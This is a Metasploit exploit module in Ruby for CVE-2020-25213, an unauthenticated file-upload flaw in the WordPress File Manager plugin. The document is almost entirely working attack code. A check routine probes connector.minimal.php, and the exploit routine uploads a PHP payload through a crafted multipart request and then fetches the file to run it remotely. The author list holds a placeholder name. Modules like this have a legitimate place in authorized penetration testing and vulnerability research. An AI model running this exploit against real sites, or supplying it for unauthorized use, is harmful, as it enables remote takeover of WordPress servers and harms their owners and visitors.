##
# This module requires Metasploit Framework
#

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress File Manager Plugin Unauthenticated Arbitrary File Upload',
        'Description' => %q{
          This module exploits an unauthenticated arbitrary file upload vulnerability
          in the WordPress File Manager plugin versions 6.0 to 6.8. By directly
          accessing the connector.minimal.php file, an attacker can upload
          arbitrary PHP files, leading to remote code execution.
        },
        'Author' => [
          'w4fz5uck5', # Original discovery
          'Ville Korhonen', # Submitter
          'Your Name Here'  # Metasploit module
        ],
        'References' => [
          ['CVE', '2020-25213'],
          ['URL', 'https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9'],
          ['URL', 'https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py'],
          ['URL', 'https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/'],
          ['URL', 'https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/'],
          ['URL', 'https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/'],
          ['URL', 'https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html'],
          ['URL', 'https://twitter.com/w4fz5uck5/status/1298402173554958338']
        ],
        'DisclosureDate' => '2020-09-01',
        'License' => MSF_LICENSE,
        'Platform' => ['php'],
        'Arch' => ARCH_PHP,
        'Privileged' => false,
        'Targets' => [
          [
            'Automatic',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'TARGETURI' => '/'
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the wordpress application', '/']),
        OptString.new('PLUGIN_PATH', [true, 'The path to the wp-file-manager plugin', 'wp-content/plugins/wp-file-manager/'])
      ]
    )
  end

  def check
    vuln_path = normalize_uri(target_uri.path, datastore['PLUGIN_PATH'], 'lib/php/connector.minimal.php')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => vuln_path
    )

    if res && res.code == 200 && res.body.include?('elFinderConnector.class.php')
      return CheckCode::Vulnerable
    else
      return CheckCode::Safe
    end
  end

  def exploit
    print_status("Exploiting #{peer}...")

    # Generate a random filename
    filename = "#{rand_text_alpha(8..12)}.php"
    
    # Craft the payload
    php_payload = "<?php #{payload.encoded} ?>"

    # Path to the vulnerable connector.minimal.php
    vuln_path = normalize_uri(target_uri.path, datastore['PLUGIN_PATH'], 'lib/php/connector.minimal.php')
    
    # Construct the upload parameters
    post_data = Rex::MIME::Message.new
    post_data.add_part('upload', php_payload, 'application/x-php', "form-data; name=\"upload[]\"; filename=\"#{filename}\"")
    post_data.add_part('upload', rand_text_alpha(4), nil, "form-data; name=\"mtime[]\"") # This is required to bypass the check
    post_data.add_part('cmd', 'upload', nil, "form-data; name=\"cmd\"")
    post_data.add_part('target', 'l1_Lw', nil, "form-data; name=\"target\"") # Target folder.  l1_Lw is the base directory.

    data = post_data.to_s

    # Send the upload request
    print_status("Uploading payload: #{filename}...")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => vuln_path,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => data
    })

    if res && res.code == 200 && res.body.include?(filename)
        print_good("File uploaded successfully.")
      else
        print_error("File upload failed.")
        return
    end

    # Construct the URL to trigger the payload
    payload_url = normalize_uri(target_uri.path, datastore['PLUGIN_PATH'], 'lib/files', filename)
    print_status("Executing payload: #{payload_url}...")
    
    # Trigger the payload (execute the uploaded PHP file)
    send_request_cgi({
      'method' => 'GET',
      'uri' => payload_url
    })
  end
end